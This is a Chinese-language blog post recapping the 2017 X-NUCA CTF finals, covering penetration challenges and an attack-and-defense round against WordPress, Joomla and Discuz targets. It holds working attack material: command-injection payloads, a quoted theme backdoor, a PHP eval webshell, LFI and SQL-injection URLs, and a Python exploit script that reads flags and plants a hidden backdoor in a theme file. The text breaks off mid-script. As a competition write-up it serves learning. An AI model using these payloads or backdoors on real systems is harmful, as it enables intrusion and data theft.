<!DOCTYPE html>
<html lang="pt">

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title>[2017 X-NUCA]总决赛小结 | Pr0ph3t's blog</title>

    <!-- Bootstrap -->
    <link rel="stylesheet" href="/assets/css/bootstrap-3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="https://libs.cdnjs.net/fancybox/3.5.7/jquery.fancybox.min.css">

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    <link rel="shortcut icon" href="/assets/images/favicon.png">

    <link rel="alternate" type="application/atom+xml" title="Atom Feed" href="/feed/"> 

</head>


    <body>
      <div class="container">

        <header class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <h1 class="">Pr0ph3t</h1>
    <p>
    <span class="reserved">char</span> nick[<span class="number">7</span>] = <span class="string">"Pr0ph3t"</span>;
    </p>
    <p>
    printf(<a href="https://github.com/t3hp0rP" target="_blank"><span class="string">"https://github.com/<span class="reserved">%s\n</span>"</span></a>,nick);
    </p>
    <p>
    printf(<span class="string">"<span class="reserved">%s\x40</span>pr0ph3t<span class="reserved">\x2e\\\b</span>com<span class="reserved">\n</span>"</span>,<span class="string">"admin"</span>);
    </p>
    <!-- <p>
            printf(<a href="https://blog.pr0ph3t.com" target="_blank"><span class="string">"https://<span class="reserved">%s</span>.pr0ph3t.com<span class="reserved">\n</span>"</span></a>,nick);
        </p> -->
    <p>
    puts(<a href="/assets/misc/pubkey.gpg.txt" target="_blank"><span class="string">"91B6 191A C2C3 285C 201D  801B B5A3 6B56 8528 E140"</span></a>);
    </p>
  </div>
</header>

<div class="row">
  <div class="col-lg-8 col-lg-offset-2">
    <div class="menu">
      <ul>
          <li><a href="/">home</a></li>
          <li><a href="/articles/">articles</a></li>
          <li><a href="/friendlink">friends</a></li>
      </ul>
    </div>
  </div>
</div>



        <div class="row">
          <div class="col-lg-8 col-lg-offset-2">
            <main>
            <div class="post">

  <header class="post-header">
    <h1>[2017 X-NUCA]总决赛小结</h1>
  </header>

  <article class="post-content">
  <div class="post">

  <header class="post-header">
    <p class="meta">
        Dec 24, 2017
        
        
        •
        <span><a href="/category/#CyberSecurity" class="reserved">CyberSecurity</a>,</span><span><a href="/category/#Attack&Defense" class="reserved">Attack&Defense</a>,</span><span><a href="/category/#old" class="reserved">old</a></span>
        
          <span id="/posts/X-NUCA-%E6%80%BB%E5%86%B3%E8%B5%9B%E5%B0%8F%E7%BB%93/" class="leancloud_visitors" data-flag-title="[2017 X-NUCA]总决赛小结">
            Page view:
            <span class="leancloud-visitors-count"></span>
          </span>
        
    </p>
  </header>

  <article class="post-content">
  <blockquote>
  <p>这次X-NUCA的线下赛分成两个部分，第一个是个人赛(纯渗透) 第二个是团队赛(渗透+A&amp;D)</p>
</blockquote>

<hr />

<h2 id="个人赛">个人赛</h2>

<p>个人赛的网络拓扑图
<img src="/assets/images/posts/2017/X-NUCA-总决赛小结/1.jpg" alt="个人赛拓扑.jpeg" />
（图片有点糊</p>

<p>简单来说就是：
选手 –&gt; 连接VPN  –&gt; 到内网访问竞赛平台,通过竞赛平台得到跳板机(攻击机)的ip、连接端口和密码(注意这里的攻击机的意思是你要去这部机上面去攻击靶机)，主办方提供了两部攻击机，一部linux一部windows，攻击机不能访问外网</p>

<p>因为自己的电脑是可以访问外网的 所以一直在思考能不能将题目都通过端口转发转出去公网后让小伙伴也体验一下（最终还是没有尝试。。。因为做题时间实在是太紧了。。。</p>

<p>主办方一共给出了6个靶机，其中有一题是pwn，题目ip和端口都要求自己扫描出来</p>

<p>扫出来之后发现很多都有开放22端口、80端口和3306端口，第二题还开放了21端口
然后其中我做出来的是第二题，ftp尝试连接之后发现是ProFTP 1.3.5，经过主办方放hint后知道突破点在这个ftp的mod_copy模块上，搜一波cve发现是这个<a href="https://www.exploit-db.com/exploits/36803/">ProFTPd 1.3.5 - ‘mod_copy’ Remote Command Execution</a> 其实msf也有相应的模块可以直接用 直接写webshell到web默认目录(/var/www/html/)后getshell看flag</p>

<blockquote>
  <p>其他题目问了各位师傅后简单总结。。。。因为没看到题目可以描述有点偏差。。请各位大佬斧正Orz</p>
</blockquote>

<ul>
  <li>
    <p>第一题
题目开放端口：22、80、3306
80端口是一个Joomla 扫描目录会发现有<strong><em>www.zip</em></strong>目录备份 里面会有一个moadmin.php文件，这里师傅说15年百度杯的时候出过相类似的题目，moadmin.php里面有任意命令执行 <a href="https://zhuanlan.zhihu.com/p/26149713">相关链接</a></p>
  </li>
  <li>
    <p>第二题
题目开放端口：21、22、80、3306
上述</p>
  </li>
  <li>
    <p>第三题
题目开放端口：22、80、10000
这题是pwn题 进去80下载二进制文件 不懂二进制。。。就不分析了Orz。。需要文件的大佬可以私聊一下我</p>
  </li>
  <li>
    <p>第四题
题目开放端口：22、80、3306
大佬说这题很奇怪。。。80端口是个joomla，然后ssh连接root@ip之后会返回一个sqli文件？？？？然后里面泄漏了一个webshell的名字，然后访问cat flag就行了</p>
  </li>
  <li>
    <p>第五题
题目开放端口：22
第五题主办方提示了是一个新手写的python脚本，其中开放了udp端口 然后要注意的是nmap默认不扫udp端口 然后扫到端口之后连接发现疑似是一个os.system(“ls “ + input) ,直接拼接命令cat flag, 如：</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> | <span class="nb">echo</span> | <span class="nb">cat </span>flag
<span class="nb">ls</span> <span class="o">&amp;&amp;</span> <span class="nb">cat </span>flag
...
</code></pre></div></div>

<ul>
  <li>第六题
题目开放端口：22、80、3306
一进去是一个黑页， 主办方提示和黑页作者名字有关 猜想应该是进入之后getshell cat flag 貌似暂时没人做出</li>
</ul>

<hr />

<p>我觉得这次个人赛的关键是服务探测和端口转发，包括服务所在的ip、端口、banner等等获取完整，再根据服务所在的ip和端口进行转发到攻击机上，最后在自己的电脑利用工具和现有exp进行攻击后得到flag</p>

<p>附上端口转发常用命令：
Linux</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-C</span> <span class="nt">-f</span> <span class="nt">-N</span> <span class="nt">-g</span> <span class="nt">-L</span> 本地端口:靶机:欲转发端口 跳板机用户@本地IP <span class="c">#此命令用于转发单一端口 运行在本机上</span>
ssh <span class="nt">-C</span> <span class="nt">-f</span> <span class="nt">-N</span> <span class="nt">-g</span> <span class="nt">-D</span> 本地监听端口 跳板机用户@跳板机IP <span class="c">#此命令用于动态端口转发 开启的是socks5</span>
</code></pre></div></div>

<p>Windows</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh interface portproxy show all <span class="c">#此命令查看所有端口转发</span>
netsh interface portproxy add v4tov4 <span class="nv">listenport</span><span class="o">=</span>本地监听端口 <span class="nv">listenaddress</span><span class="o">=</span>0.0.0.0 <span class="nv">connectport</span><span class="o">=</span>欲转发端口 <span class="nv">connectaddress</span><span class="o">=</span>欲转发ip <span class="c">#此命令新增一个端口转发</span>
netsh interface portproxy delete v4tov4 <span class="nv">listenport</span><span class="o">=</span>本地监听端口 <span class="nv">listenaddress</span><span class="o">=</span>0.0.0.0 <span class="c">#此命令删除一个端口转发</span>
</code></pre></div></div>

<p>这次手慢了。。。没有来得及喝上汤。。。。。Orz膜各位大佬。。。</p>

<hr />

<h2 id="团队赛">团队赛</h2>

<p>这次团队赛的比赛模式之前是没有遇到过的，网络拓扑如下(第二天才给的)：
<img src="/assets/images/posts/2017/X-NUCA-总决赛小结/2.jpg" alt="部分拓扑" /></p>

<ul>
  <li>第一天下午
    <ul>
      <li>第一天下午是渗透+A&amp;D同时进行的模式，一共有10台靶机，也就是带有用户名为info1-info10的服务器，其中有5台是攻防机，攻防机的还有用户名score1-score5 — 攻防共有两个Web，三个Pwn。我们的目标是需要找出攻防机并趁早拿下源码和开始攻击，在这过程中10台靶机的/etc/xnuca/flag.txt路径都有渗透flag，提交会得到100分，然后攻防机还会在/opt/xnuca/flag.txt路径存储A&amp;D用的flag。</li>
      <li>根据上面的规矩我们可以知道，第一天拿到Web源码的队伍晚上肯定会通宵审计找出洞之后打全场，所以第一天的源码必须要拿下。然后实际上第一天听说只有几个队伍拿下了第一个Web的源码，只有一两支队伍拿下了第二个Web的源码，pwn的源码貌似没有人拿到？ 然后下午饭点的时候主办方将所有pwn的程序公布了出来。。。（晚上不敢睡了。。</li>
      <li>回到正题，首先我们需要扫描192.108.1.0/24得到与我们机器直连的靶机地址，然后扫描端口发现都开了445 netbios服务（本来这里是想尝试着用永恒之蓝打一下，但是主办方说这个端口是用来探测服务名称的 所以使用一个命令 nmblookup - 基于TCP/IP上的NetBIOS客户用于查询NetBIOS名字的程序 来探测服务名称</li>
      <li>首先能扫描到4台直连的存活主机，首先第一台的web服务(info1)是一个MacCMS(苹果cms)，网上搜到这个Remote Code Execute的<a href="https://www.0dayhack.com/post-285.html">exp</a>，ls查看到一个文件名叫score1_shadow_backup文件，还有一个文件名叫password_is_phone_num_13993xxxxxx，然后shadow文件里面是score1的密码，直接丢去hashcat六位数字爆破（这里我坑了。。。没有及时告诉队友phone_num是密码提示。。。导致最后面才登录上拿到源码）然后查看数据库配置文件，有注释说这是从info2迁移的，连接数据库是info2用户，得到info2的密码为call911，然后登录上info2后在home目录发现mysql history，打开后发现是创建了一个info8的用户，密码为arkteam。</li>
      <li>第二台服务器的Web服务是Discuz 7.2，网上也能找到相应的<a href="http://blog.csdn.net/yiyefangzhou24/article/details/36913287/">exp</a>，拿到密码之后登录，这里有点记得不太清楚了Orz。。。貌似是拿到info4的账号密码就直接ssh能登录上去了</li>
      <li>然后第三台的Web服务是一个大马 Hack By NSA。。。。。。主办方提示是nopen的后门。。。但是这个到最后面都没有解出来是啥。。。</li>
      <li>第四台Web服务是一个wordpress，后面getshell之后查看用户也可以知道这也是一台攻防机，因为看到了score1用户， 然后这里是弱密码admin/admin登录上后台之后上传插件getshell，直接将shell打包成zip后上传，他会帮你解压到wp-content/uploads/2017/12/目录下，虽然安装出错但是还是会保留下文件。</li>
    </ul>
  </li>
</ul>

<hr />

<p>以上是第一层直连外网的机器(192.108.1.0/24)
第二层我们想开始渗透的时候发现score1已经被师傅们打了Orz。。。所以我就没有渗透第二层太多了。。这是比较大的失误。。。我们应该继续坚持渗透，拿下web2的源码的。。。。所以就这样后面的题目就没有继续渗透下去了。。。哭。。。</p>

<hr />

<p>我们晚上分析了一下web1的源码，主要发现了以下的几个洞：</p>
<ol>
  <li>著名的主题后门–<a href="https://paper.seebug.org/140/">详情</a> 这里也是大同小异
看/wp-content/themes/AccountingTime/Functions.php的最后面</li>
</ol>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="k">function</span> <span class="nf">_getprepare_widgets</span><span class="p">(){</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$methods</span><span class="p">))</span> <span class="nv">$methods</span><span class="o">=</span><span class="s2">"cookie"</span><span class="p">;</span>  <span class="c1">//</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$pre</span><span class="p">))</span> <span class="nv">$pre</span><span class="o">=</span><span class="s2">"wp_"</span><span class="p">;</span>  <span class="c1">//</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$is_use_more</span><span class="p">))</span> <span class="nv">$is_use_more</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>  <span class="c1">// </span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="nv">$d</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"d"</span><span class="p">];</span>  <span class="c1">//</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$posts_auth</span><span class="p">))</span> <span class="nv">$posts_auth</span><span class="o">=</span><span class="s2">"auth"</span><span class="p">;</span>  <span class="c1">//</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$widget</span><span class="p">))</span> <span class="nv">$widget</span><span class="o">=</span><span class="nv">$pre</span><span class="o">.</span><span class="s2">"set"</span><span class="o">.</span><span class="s2">"_"</span><span class="o">.</span><span class="nv">$posts_auth</span><span class="o">.</span><span class="s2">"_"</span><span class="o">.</span><span class="nv">$methods</span><span class="p">;</span>  <span class="c1">//</span>
	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$forcemore</span><span class="p">))</span> <span class="nv">$forcemore</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>  <span class="c1">//</span>
	<span class="k">if</span> <span class="p">(</span><span class="nv">$is_use_more</span> <span class="p">)</span> <span class="p">{</span>
		<span class="k">if</span><span class="p">(</span><span class="nv">$forcemore</span><span class="p">)</span> <span class="p">{</span>
			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_user_logged_in</span><span class="p">())</span>
				<span class="o">@</span><span class="nb">call_user_func_array</span><span class="p">(</span><span class="nv">$widget</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span> <span class="kc">true</span><span class="p">));</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="nv">$output</span><span class="o">=</span><span class="s2">""</span><span class="p">;</span>
	<span class="k">return</span> <span class="nv">$output</span><span class="p">;</span>
<span class="p">}</span>

<span class="nx">add_action</span><span class="p">(</span><span class="s2">"init"</span><span class="p">,</span> <span class="s2">"_getprepare_widgets"</span><span class="p">);</span>	 <span class="c1">// 注册函数</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>我们直接在前台某个页面输入 ?d=1就可以越权登录admin了
登录之后可以有两个getshell点
第一个是对主题文件的编辑，其中有php文件
第二个是上传压缩成zip的webshell，上传后被解压在/wp-content/uploads/2017/12/</p>

<ol>
  <li>被留下的一句话
在/wp-includes/rest-api/endpoints/class-wp-rest-relations-controller.php中，内容为</li>
</ol>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ol>
  <li>
    <p>LFI – wp-vault插件
在/wp-content/plugins/wp-vault/trunk/wp-vault.php中，wpv-image参数没有过滤就直接包含<img src="/assets/images/posts/2017/X-NUCA-总决赛小结/3.png" alt="LFI" />利用方法：http://xxx/wp-content/plugins/wp-vault/trunk/wp-vault.php?wpv-image=../../../../../../etc/passwd</p>
  </li>
  <li>
    <p>sql注入 – kittycatfish 2.2插件
<a href="https://www.unhonker.com/bug/1991.html">poc</a>
注入点1 ：/wp-content/plugins/kittycatfish/base.css.php?kc_ad=31&amp;ver=2.0
注入点2：wp-content/plugins/kittycatfish/kittycatfish.php?kc_ad=37&amp;ver=2.0
都是kc_ad参数，可以使用盲注直接load_file读取flag文件</p>
  </li>
  <li>
    <p>sql注入 – olimometer插件
注入点：/wp-content/plugins/olimometer/thermometer.php?olimometer_id=1
olimometer_id参数可以盲注</p>
  </li>
  <li>
    <p>sql注入 – easy-modal插件
<a href="https://www.exploit-db.com/exploits/42431/">poc</a>
同盲注，但是首先得登录进后台才能利用，比较鸡肋</p>
  </li>
  <li>
    <p>sql注入？ – ultimate-product-catalogue
好吧这个没有注入，进去看了一下作者已经加了参数绑定了。。。</p>
  </li>
</ol>

<p>我们有点乱的利用脚本</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding:utf8
</span><span class="kn">import</span> <span class="nn">urllib</span><span class="p">,</span><span class="n">urllib2</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">cookielib</span>
<span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">def</span> <span class="nf">easy_webshell</span><span class="p">(</span><span class="n">root_url</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">'/wp-includes/rest-api/endpoints/class-wp-rest-relations-controller.php?%s'</span> <span class="o">%</span> <span class="s">'cmd=system("cat+/opt/xnuca/flag.txt");'</span>
		<span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
		<span class="n">content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
		<span class="k">if</span> <span class="n">content</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">print</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">' -- flag : '</span> <span class="o">+</span> <span class="n">content</span>
			<span class="k">return</span> <span class="mi">1</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">print</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">' fail to get flag through easy_webshell'</span>
			<span class="k">return</span> <span class="mi">0</span>
	<span class="k">except</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">'web_shell error'</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">reason</span>

<span class="k">def</span> <span class="nf">LFI</span><span class="p">(</span><span class="n">root_url</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">'/wp-content/plugins/wp-vault/trunk/wp-vault.php?wpv-image=../../../../../opt/xnuca/flag.txt'</span>
		<span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
		<span class="n">content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
		<span class="k">if</span> <span class="n">content</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">print</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">' -- flag : '</span> <span class="o">+</span> <span class="n">content</span>
			<span class="k">return</span> <span class="mi">1</span>
		<span class="k">else</span><span class="p">:</span>
			<span class="k">print</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">' fail to get flag through LFI'</span>
			<span class="k">return</span> <span class="mi">0</span>
	<span class="k">except</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">'LFI error'</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">reason</span>

<span class="k">def</span> <span class="nf">loginAsAdmin</span><span class="p">(</span><span class="n">root_url</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">root_url</span>
		<span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
		<span class="k">if</span> <span class="s">'uniform tax rebate chef'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">():</span>
			<span class="k">print</span> <span class="s">'Theme Not Correct!'</span>
			<span class="k">return</span>
		<span class="n">url</span> <span class="o">=</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">'/?d=1'</span>
		<span class="n">cookie</span> <span class="o">=</span> <span class="n">cookielib</span><span class="p">.</span><span class="n">CookieJar</span><span class="p">()</span>
		<span class="n">opener</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">build_opener</span><span class="p">(</span><span class="n">urllib2</span><span class="p">.</span><span class="n">HTTPCookieProcessor</span><span class="p">(</span><span class="n">cookie</span><span class="p">))</span>
		<span class="n">req</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">url</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">opener</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">opener</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">req</span><span class="p">)</span>
		<span class="n">content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
		<span class="k">if</span> <span class="s">'登出'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">content</span><span class="p">:</span>
			<span class="c1"># print '[!] Cannot log in as admin!!!'
</span>			<span class="c1"># print content
</span>			<span class="k">return</span>
		<span class="k">return</span> <span class="n">opener</span>
	<span class="k">except</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">URLError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
		<span class="k">print</span> <span class="s">'login error'</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">reason</span>

<span class="k">def</span> <span class="nf">uploadShell</span><span class="p">(</span><span class="n">root_url</span><span class="p">):</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="n">opener</span> <span class="o">=</span> <span class="n">loginAsAdmin</span><span class="p">(</span><span class="n">root_url</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">opener</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
			<span class="k">print</span> <span class="s">'[!] Cannot log in as admin!!!'</span>
			<span class="k">return</span>
		<span class="n">installUrl</span> <span class="o">=</span> <span class="n">root_url</span> <span class="o">+</span> <span class="s">'/wp-admin/theme-editor.php?file=footer.php&amp;theme=AccountingTime'</span>
		<span class="n">getNonceReq</span> <span class="o">=</span> <span class="n">urllib2</span><span class="p">.</span><span class="n">Request</span><span class="p">(</span><span class="n">url</span> <span class="o">=</span> <span class="n">installUrl</span><span class="p">)</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">opener</span><span class="p">.</span><span class="nb">open</span><span class="p">(</span><span class="n">getNonceReq</span><span class="p">)</span>
		<span class="n">content</span> <span class="o">=</span> <span class="n">res</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
		<span class="k">if</span> <span class="n">content</span> <span class="o">==</span> <span class="s">''</span><span class="p">:</span>
			<span class="k">print</span> <span class="s">'get Nonce Page Error!!!'</span>
			<span class="k">return</span>
		<span class="n">nonceList</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="n">findall</span><span class="p">(</span><span class="s">'&lt;input type="hidden" id="_wpnonce" name="_wpnonce" value="([a-zA-Z0-9]+)"'</span><span class="p">,</span><span class="n">content</span><span class="p">)</span>
		<span class="k">if</span> <span class="n">nonceList</span> <span class="o">==</span> <span class="p">[]:</span>
			<span class="k">print</span> <span class="s">'get Nonce Page Error!!!!'</span>
			<span class="k">return</span>
		<span class="n">nonce</span> <span class="o">=</span> <span class="n">nonceList</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
		<span class="n">boundary</span> <span class="o">=</span> <span class="s">'----------%s'</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">.</span><span class="n">time</span><span class="p">()</span> <span class="o">*</span> <span class="mi">1000</span><span class="p">))</span>
		<span class="n">data</span> <span class="o">=</span> <span class="p">[]</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'_wpnonce'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">nonce</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'_wp_http_referer'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'/wp-admin/plugin-install.php'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'newcontent'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'''
&lt;?php global $theme; ?&gt;
    
&lt;?php if($theme-&gt;display('footer_widgets')) { ?&gt;
    &lt;div id="footer-widgets" class="clearfix"&gt;
        &lt;?php
        /**
        * Footer  Widget Areas. Manage the widgets from: wp-admin -&gt; Appearance -&gt; Widgets 
        */
        ?&gt;
        &lt;div class="footer-widget-box"&gt;
            &lt;?php
                if(!dynamic_sidebar('footer_1')) {
                    $theme-&gt;hook('footer_1');
                }
            ?&gt;
        &lt;/div&gt;
        
        &lt;div class="footer-widget-box"&gt;
            &lt;?php
                if(!dynamic_sidebar('footer_2')) {
                    $theme-&gt;hook('footer_2');
                }
            ?&gt;
        &lt;/div&gt;
        
        &lt;div class="footer-widget-box footer-widget-box-last"&gt;
            &lt;?php
                if(!dynamic_sidebar('footer_3')) {
                    $theme-&gt;hook('footer_3');
                }
            ?&gt;
        &lt;/div&gt;
        
    &lt;/div&gt;
&lt;?php  } ?&gt;

    &lt;div id="footer"&gt;
    
        &lt;div id="copyrights"&gt;
            &lt;?php
                if($theme-&gt;display('footer_custom_text')) {
                    $theme-&gt;option('footer_custom_text');
                } else { 
                    ?&gt; &amp;copy; &lt;?php echo date('Y'); ?&gt;  &lt;a href="&lt;?php echo home_url(); ?/g"&gt;&lt;?php bloginfo('name'); ?&gt;&lt;/a&gt;&lt;?php
                }
            ?&gt; 
        &lt;/div&gt;
        
        &lt;?php /* 
            All links in the footer should remain intact. 
            These links are all family friendly and will not hurt your site in any way. 
            Warning! Your site may stop working if these links are edited or deleted 
            
            You can buy this theme without footer links online at https://flexithemes.com/buy/?theme=accountingtime
        */ ?&gt;
        
        &lt;div id="credits"&gt;Powered by &lt;a href="http://wordpress.org/"&gt;&lt;strong&gt;WordPress&lt;/strong&gt;&lt;/a&gt; | Theme Designed by: &lt;?php echo wp_theme_credits(0); ?&gt;  | Thanks to &lt;?php echo wp_theme_credits(1); ?&gt;, &lt;?php echo wp_theme_credits(2); ?&gt; and &lt;?php echo wp_theme_credits(3); ?&gt;&lt;/div&gt;&lt;!-- #credits --&gt;
        
    &lt;/div&gt;&lt;!-- #footer --&gt;
    
&lt;/div&gt;&lt;!-- #container --&gt;

&lt;?php wp_footer(); ?&gt;
&lt;?php $theme-&gt;hook('html_after'); ?&gt;
&lt;/body&gt;
&lt;/html&gt;
&lt;?php if md5($_GET['pr0ph3t'])=='379377cfde157b4d7f6529d448dadd23' echo file_get_contents('/opt/xnuca/flag.txt');?&gt;
'''</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'Content-Disposition: form-data; name="%s"</span><span class="se">\r\n</span><span class="s">'</span> <span class="o">%</span> <span class="s">'action'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'update'</span><span class="p">)</span>
		<span class="n">data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">'--%s'</span> <span class="o">%</span> <span class="n">boundary</span><span class="p">)</span>

